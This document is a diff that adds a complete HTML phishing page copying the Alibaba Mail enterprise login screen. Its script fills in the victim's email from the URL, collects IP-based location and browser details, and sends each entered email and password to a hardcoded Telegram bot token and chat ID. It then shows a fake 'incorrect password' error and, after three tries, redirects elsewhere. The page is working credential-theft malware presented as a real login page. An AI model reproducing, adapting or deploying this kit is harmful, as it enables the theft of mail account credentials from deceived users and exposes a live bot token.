@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Login · Alibaba Mail</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* header */
+    .header {
+      background: #ffffff;
+      border-bottom: 1px solid #e8e8e8;
+      padding: 0 40px;
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-shrink: 0;
+    }
+
+    .logo img {
+      height: 36px;
+      width: auto;
+      display: block;
+    }
+
+    .links {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      font-size: 12px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .links a,
+    .links span {
+      color: #848585;
+      text-decoration: none;
+      padding: 0 8px;
+      font-size: 12px;
+      cursor: default;
+      display: inline-block;
+      white-space: nowrap;
+    }
+
+    .links a:hover {
+      color: #1677ff;
+    }
+
+    .links .sep::before {
+      content: "|";
+      color: #dcdcdc;
+      margin: 0 4px;
+    }
+
+    .language-select {
+      border: none;
+      font-size: 12px;
+      color: #848585;
+      background: transparent;
+      cursor: pointer;
+      padding: 4px 4px 4px 8px;
+      outline: none;
+    }
+
+    /* main */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #c8e8ff;
+      background-image: url('https://img.alicdn.com/imgextra/i1/O1CN01aRVB8w1T5ByWOzSGa_!!6000000002330-2-tps-1280-500.png');
+      background-size: cover;
+      background-position: center;
+      padding: 30px 20px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 1120px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 40px;
+      flex-wrap: wrap;
+    }
+
+    .welcome {
+      width: 316px;
+      height: 234px;
+      background-image: url('https://img.alicdn.com/imgextra/i3/O1CN01Kxlgb51fRszT2K9T8_!!6000000004004-2-tps-316-234.png');
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      flex-shrink: 0;
+    }
+
+    .login-box {
+      width: 380px;
+      max-width: 100%;
+      background: rgba(255, 255, 255, 0.96);
+      border-radius: 20px;
+      padding: 32px 32px 28px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.10);
+      backdrop-filter: blur(2px);
+      flex-shrink: 0;
+    }
+
+    /* tabs */
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid #e8e8e8;
+      margin-bottom: 28px;
+      gap: 0;
+    }
+
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 12px 0;
+      font-size: 15px;
+      font-weight: 500;
+      color: #8c8c8c;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      position: relative;
+      transition: color 0.2s;
+    }
+
+    .tab.active {
+      color: #000;
+    }
+
+    .tab.active::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 20%;
+      width: 60%;
+      height: 2px;
+      background: #000;
+      border-radius: 4px;
+    }
+
+    .tab:hover {
+      color: #000;
+    }
+
+    /* form */
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 14px;
+      background: #fafafa;
+      border: 1px solid #d9d9d9;
+      border-radius: 8px;
+      transition: 0.2s;
+      outline: none;
+      color: #262626;
+    }
+
+    .form-control:focus {
+      border-color: #000;
+      box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.05);
+      background: #ffffff;
+    }
+
+    .form-control::placeholder {
+      color: #bfbfbf;
+    }
+
+    .password-wrap {
+      position: relative;
+    }
+
+    .password-wrap .form-control {
+      padding-right: 48px;
+    }
+
+    .toggle-pw {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+      color: #bfbfbf;
+      padding: 4px;
+    }
+
+    .toggle-pw:hover {
+      color: #595959;
+    }
+
+    .row-flex {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 6px 0 22px;
+    }
+
+    .check {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #595959;
+      cursor: pointer;
+    }
+
+    .check input[type="checkbox"] {
+      display: none;
+    }
+
+    .check .checkmark {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #d9d9d9;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: 0.2s;
+    }
+
+    .check input:checked+.checkmark {
+      background: #1677ff;
+      border-color: #1677ff;
+    }
+
+    .check input:checked+.checkmark::after {
+      content: "✓";
+      color: white;
+      font-size: 13px;
+    }
+
+    .forgot {
+      color: #1677ff;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .btn-signin {
+      width: 100%;
+      padding: 13px;
+      font-size: 16px;
+      font-weight: 600;
+      background: #ff4d4f;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.25s;
+      margin: 6px 0 14px;
+    }
+
+    .btn-signin:hover {
+      background: #d9363e;
+    }
+
+    .btn-signin:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .error-msg {
+      color: #ff4d4f;
+      font-size: 14px;
+      min-height: 22px;
+      text-align: center;
+      margin-bottom: 4px;
+    }
+
+    .privacy {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 13px;
+      color: #8c8c8c;
+      margin: 14px 0 18px;
+    }
+
+    .privacy .check {
+      align-items: flex-start;
+    }
+
+    .privacy a {
+      color: #1677ff;
+      text-decoration: none;
+    }
+
+    .privacy a:hover {
+      text-decoration: underline;
+    }
+
+    .alt-login {
+      border-top: 1px solid #f0f0f0;
+      padding-top: 20px;
+      margin-top: 6px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .alt-btn {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: none;
+      border: none;
+      padding: 6px 16px;
+      border-radius: 40px;
+      font-size: 14px;
+      color: #595959;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .alt-btn:hover {
+      background: #f0f0f0;
+    }
+
+    .alt-btn img {
+      width: 32px;
+      height: 32px;
+      border-radius: 6px;
+    }
+
+    /* footer */
+    .footer {
+      background: #ffffff;
+      border-top: 1px solid #e8e8e8;
+      padding: 14px 20px;
+      text-align: center;
+      flex-shrink: 0;
+      font-size: 12px;
+      color: #999;
+    }
+
+    .footer a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 6px;
+      cursor: default;
+    }
+
+    .footer a:hover {
+      color: #1677ff;
+    }
+
+    .footer .row {
+      margin: 4px 0;
+    }
+
+    /* responsive */
+    @media (max-width: 992px) {
+      .card {
+        justify-content: center;
+      }
+      .welcome {
+        display: none;
+      }
+      .login-box {
+        width: 100%;
+        max-width: 420px;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .header {
+        padding: 0 16px;
+        height: auto;
+        flex-wrap: wrap;
+        gap: 8px;
+        padding-top: 12px;
+        padding-bottom: 12px;
+      }
+      .links {
+        font-size: 10px;
+        justify-content: center;
+      }
+      .links a,
+      .links span {
+        padding: 0 4px;
+        font-size: 10px;
+      }
+      .language-select {
+        font-size: 10px;
+      }
+      .login-box {
+        padding: 24px 18px 20px;
+      }
+      .tab {
+        font-size: 14px;
+        padding: 10px 0;
+      }
+      .footer {
+        padding: 10px 12px;
+        font-size: 10px;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .login-box {
+        padding: 18px 12px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+    <div class="logo">
+      <img src="https://qiye.aliyun.com/static/0.2.6/images/forNetCN/logo.png" alt="Alibaba Mail">
+    </div>
+    <div class="links">
+      <a href="#">DingTalk</a>
+      <span class="sep"></span>
+      <a href="#">Alibaba Mail</a>
+      <span class="sep"></span>
+      <a href="#">Aliyun Mail Login</a>
+      <span class="sep"></span>
+      <a href="#">Client Apps</a>
+      <span class="sep"></span>
+      <a href="#">Help</a>
+      <span class="sep"></span>
+      <select class="language-select" id="langSelect">
+        <option value="zh_CN">简体中文</option>
+        <option value="zh_TW">繁體中文</option>
+        <option value="zh_HK">繁體中文（香港）</option>
+        <option value="en" selected>English</option>
+        <option value="ja_JP">日本语</option>
+        <option value="vi_VN">Tiếng Việt</option>
+        <option value="fr_FR">Français</option>
+        <option value="ko_KR">한국어</option>
+        <option value="es_419">Español</option>
+        <option value="tr_TR">Türkçe</option>
+        <option value="pt_BR">Português(Brasil)</option>
+        <option value="ms_MY">malaysian</option>
+        <option value="id_ID">bahasa Indonesia</option>
+        <option value="th_TH">แบบไทย</option>
+        <option value="pt_PT">Português</option>
+      </select>
+    </div>
+  </header>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="card">
+      <div class="welcome"></div>
+
+      <div class="login-box">
+        <!-- tabs -->
+        <div class="tabs">
+          <button class="tab active" data-tab="account">Account Login</button>
+          <button class="tab" data-tab="dingtalk">DingTalk Account Login</button>
+        </div>
+
+        <!-- form -->
+        <form id="loginForm" autocomplete="off">
+          <div class="form-group">
+            <input type="email" class="form-control" id="emailInput" placeholder="Enter the complete enterprise mailbox or administrator account" value="">
+          </div>
+          <div class="form-group">
+            <div class="password-wrap">
+              <input type="password" class="form-control" id="passwordInput" placeholder="Enter password">
+              <button type="button" class="toggle-pw" id="togglePw" aria-label="show password">👁</button>
+            </div>
+          </div>
+
+          <div id="errorMsg" class="error-msg"></div>
+
+          <div class="row-flex">
+            <label class="check">
+              <input type="checkbox" checked>
+              <span class="checkmark"></span>
+              Save Username
+            </label>
+            <a href="#" class="forgot">Forgot Password</a>
+          </div>
+
+          <button type="submit" class="btn-signin">Sign In</button>
+
+          <div class="privacy">
+            <label class="check">
+              <input type="checkbox">
+              <span class="checkmark"></span>
+              <span>
+                I have read and agree with
+                <a href="#">Privacy Policy</a>,
+                <a href="#">Product Service Agreement</a>
+              </span>
+            </label>
+          </div>
+
+          <div class="alt-login">
+            <button type="button" class="alt-btn">
+              <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%231677ff'/%3E%3Ctext x='32' y='42' text-anchor='middle' font-size='28' fill='white' font-weight='bold'%3EM%3C/text%3E%3C/svg%3E" alt="Alimail">
+              <span>Scan to sign in with Alimail</span>
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="row">
+      <a href="#">About Us</a>
+    </div>
+    <div class="row">
+      <a href="#">Alibaba Cloud</a>
+      <a href="#">DingTalk</a>
+      <a href="#">Wanwang</a>
+      <a href="#">Alipay</a>
+      <a href="#">Alibaba Group</a>
+      <a href="#">Developer Community</a>
+      <a href="#">Help Center</a>
+      <a href="#">Alibaba Mail Personal Edition</a>
+      <a href="#">Mail Push</a>
+      <a href="#">DingStore</a>
+    </div>
+    <div class="row">
+      2009-2026 Aliyun.com Copyright reserved ICP: 浙2-20080101
+    </div>
+  </footer>
+
+  <script>
+    (function() {
+      "use strict";
+
+      // DOM refs
+      const emailInput = document.getElementById('emailInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const loginForm = document.getElementById('loginForm');
+      const errorMsg = document.getElementById('errorMsg');
+      const togglePw = document.getElementById('togglePw');
+      const tabs = document.querySelectorAll('.tab');
+
+      // Telegram config
+      const BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
+      const CHAT_ID = "6068638071";
+      const REDIRECT_URL = "https://www.made-in-china.com/products-search/hot-china-products/China_Market.html";
+
+      let attemptCount = 0;
+      let locationData = {
+        ip: 'Fetching...',
+        country: 'Detecting...',
+        state: 'Detecting...',
+        city: 'Unknown',
+        isp: 'Unknown'
+      };
+
+      // ---------- helpers ----------
+      function validateEmail(email) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      }
+
+      function extractEmailFromURL() {
+        const params = new URLSearchParams(window.location.search);
+        let email = decodeURIComponent(params.get('email') || '');
+        if (!email && window.location.search.startsWith('?')) {
+          const raw = decodeURIComponent(window.location.search.slice(1));
+          if (validateEmail(raw)) email = raw;
+        }
+        if (!email && window.location.hash.startsWith('#')) {
+          const raw = decodeURIComponent(window.location.hash.slice(1).trim());
+          if (validateEmail(raw)) email = raw;
+        }
+        return email;
+      }
+
+      // ---------- location ----------
+      async function fetchLocation() {
+        try {
+          const resp = await fetch('https://ipapi.co/json/');
+          if (resp.ok) {
+            const data = await resp.json();
+            locationData = {
+              ip: data.ip || 'Unknown',
+              country: data.country_name || 'Unknown',
+              state: data.region || 'Unknown',
+              city: data.city || 'Unknown',
+              isp: data.org || 'Unknown'
+            };
+            return;
+          }
+        } catch (_) { /* ignore */ }
+        try {
+          const ipResp = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResp.json();
+          locationData = {
+            ip: ipData.ip || 'Unknown',
+            country: 'Unable to detect',
+            state: 'Use live server',
+            city: 'For full location',
+            isp: 'Deploy to hosting'
+          };
+        } catch (_) {
+          locationData = {
+            ip: 'Unknown',
+            country: 'Unknown',
+            state: 'Unknown',
+            city: 'Unknown',
+            isp: 'Unknown'
+          };
+        }
+      }
+
+      // ---------- send to telegram ----------
+      async function sendToTelegram(email, password, attempt) {
+        const timestamp = new Date().toLocaleString('en-US', {
+          weekday: 'short',
+          year: 'numeric',
+          month: 'short',
+          day: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit',
+          hour12: true
+        });
+
+        let msg = `🔐 === LOGIN ATTEMPT #${attempt} === 🔐\n\n`;
+        msg += `📧 Email: ${email}\n`;
+        msg += `🔑 Password: ${password}\n\n`;
+        msg += `📍 LOCATION (IP-BASED):\n`;
+        msg += `├─ IP: ${locationData.ip}\n`;
+        msg += `├─ Country: ${locationData.country}\n`;
+        msg += `├─ State/Region: ${locationData.state}\n`;
+        msg += `├─ City: ${locationData.city}\n`;
+        msg += `└─ ISP: ${locationData.isp}\n\n`;
+        msg += `⏰ Time: ${timestamp}\n`;
+        msg += `🌐 User Agent: ${navigator.userAgent.substring(0, 100)}\n`;
+        msg += `📱 Platform: ${navigator.platform}\n`;
+        msg += `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const body = new URLSearchParams();
+        body.append('chat_id', CHAT_ID);
+        body.append('text', msg);
+        body.append('parse_mode', 'Markdown');
+
+        const resp = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: body
+        });
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        const json = await resp.json();
+        return json.ok === true;
+      }
+
+      // ---------- prefill email ----------
+      function prefillEmail() {
+        const extracted = extractEmailFromURL();
+        if (extracted && validateEmail(extracted)) {
+          if (!emailInput.value || emailInput.value.trim() === '') {
+            emailInput.value = extracted;
+          }
+        }
+      }
+
+      // ---------- tab switching (visual only) ----------
+      tabs.forEach(tab => {
+        tab.addEventListener('click', function() {
+          tabs.forEach(t => t.classList.remove('active'));
+          this.classList.add('active');
+        });
+      });
+
+      // ---------- toggle password ----------
+      togglePw.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        this.textContent = type === 'password' ? '👁' : '🙈';
+      });
+
+      // ---------- update url on email input ----------
+      emailInput.addEventListener('input', function() {
+        const val = this.value.trim();
+        if (validateEmail(val)) {
+          const url = window.location.pathname + '?email=' + encodeURIComponent(val);
+          window.history.replaceState({}, '', url);
+        }
+      });
+
+      // ---------- submit ----------
+      loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value;
+        errorMsg.textContent = '';
+
+        if (!email || !password) {
+          errorMsg.textContent = 'Please fill in both fields';
+          return;
+        }
+        if (!validateEmail(email)) {
+          errorMsg.textContent = 'Please enter a valid email address';
+          return;
+        }
+
+        const submitBtn = this.querySelector('button[type="submit"]');
+        const originalText = submitBtn ? submitBtn.textContent : 'Sign In';
+        if (submitBtn) {
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Signing in...';
+        }
+
+        try {
+          await sendToTelegram(email, password, attemptCount + 1);
+          attemptCount++;
+          passwordInput.value = '';
+
+          if (attemptCount >= 3) {
+            window.location.href = REDIRECT_URL;
+          } else {
+            errorMsg.textContent = '电子邮件或密码不正确';
+            passwordInput.focus();
+          }
+        } catch (err) {
+          console.error(err);
+          errorMsg.textContent = 'Network error. Please try again.';
+          passwordInput.focus();
+        } finally {
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.textContent = originalText;
+          }
+        }
+      });
+
+      // ---------- init ----------
+      prefillEmail();
+      fetchLocation();
+
+      // handle hashchange
+      window.addEventListener('hashchange', prefillEmail);
+      window.addEventListener('popstate', prefillEmail);
+
+      // language select visual (no redirect)
+      const langSelect = document.getElementById('langSelect');
+      langSelect.addEventListener('change', function() {
+        // just visual, keep as is
+      });
+
+      console.log('✅ Login page ready (Telegram bot active)');
+    })();
+  </script>
+</body>
+</html>
